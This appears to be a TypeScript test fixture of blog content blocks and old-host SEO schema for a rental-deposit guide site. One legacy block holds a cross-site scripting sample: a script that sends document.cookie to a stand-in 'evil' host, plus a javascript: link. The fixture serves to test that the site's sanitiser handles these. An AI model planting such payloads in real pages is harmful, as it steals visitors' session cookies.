import type { Block } from '../../src/lib/blocks';

/**
 * One of every block shape that can reach the blog:
 *   text / heading / image / faq  — written by the pipeline
 *     (src/octypo/gatekeeper/job-handlers.ts:739,752,762,785)
 *   list                          — written only by the admin editor
 *     (admin/src/lib/blocks.ts:336)
 *   quote                         — read but never written; legacy rows only
 *     (admin/src/lib/blocks.ts:146)
 */
export const ENGINE_BLOCK_FIXTURE: Block[] = [
  { id: 'intro-1', type: 'text', data: { content: '<p>Renting starts with a deposit.</p>' } },
  { id: 'h-1', type: 'heading', data: { text: 'What to expect', level: 2 } },
  { id: 's-1', type: 'text', data: { content: '<p>Landlords hold five percent.</p>' } },
  {
    id: 'img-1',
    type: 'image',
    data: { url: 'https://pub-abc.r2.dev/hero.png', alt: 'Apartment handover', caption: 'Handover day' },
  },
  { id: 'l-1', type: 'list', data: { items: ['Photograph everything', 'Sign the snagging list'], style: 'unordered' } },
  { id: 'q-1', type: 'quote', data: { content: 'Always take the meter reading yourself.' } },
  {
    id: 'faq-1',
    type: 'faq',
    data: {
      items: [
        { question: 'Who holds the deposit?', answer: '<p>The landlord does.</p>' },
        { question: 'When is it returned?', answer: '<p>Within thirty days.</p>' },
      ],
    },
  },
];

/**
 * A row written before commit 778fc89, when nothing sanitised model output, and
 * while SITE_URL still said old-host.example. Both facts have to be survivable.
 */
export const LEGACY_UNSANITISED_BLOCKS: Block[] = [
  {
    id: 't-legacy',
    type: 'text',
    data: {
      content:
        '<p>Read the <a href="/topics/deposits" class="internal-link">deposit rules</a>.</p>' +
        '<script>fetch("//evil/"+document.cookie)</script>' +
        '<p><a href="javascript:alert(1)">tap here</a></p>',
    },
  },
];

export const OLD_HOST_SEO_SCHEMA = [
  {
    '@context': 'https://schema.org',
    '@type': 'Article',
    headline: 'Deposit rules explained',
    description: 'What tenants can claim back.',
    url: 'https://old-host.example/guides/deposit-rules-explained',
    mainEntityOfPage: { '@type': 'WebPage', '@id': 'https://old-host.example/guides/deposit-rules-explained' },
    image: ['https://pub-abc.r2.dev/hero.png'],
    author: { '@type': 'Person', name: 'Old Host Editorial' },
    publisher: { '@type': 'Organization', name: 'Old Host', url: 'https://old-host.example' },
  },
  {
    '@context': 'https://schema.org',
    '@type': 'FAQPage',
    mainEntity: [
      { '@type': 'Question', name: 'Who holds the deposit?', acceptedAnswer: { '@type': 'Answer', text: 'The landlord.' } },
    ],
  },
  {
    '@context': 'https://schema.org',
    '@type': 'BreadcrumbList',
    itemListElement: [
      { '@type': 'ListItem', position: 1, name: 'Home', item: 'https://old-host.example' },
      { '@type': 'ListItem', position: 2, name: 'Guides', item: 'https://old-host.example/guides' },
      { '@type': 'ListItem', position: 3, name: 'Deposit rules explained' },
    ],
  },
];
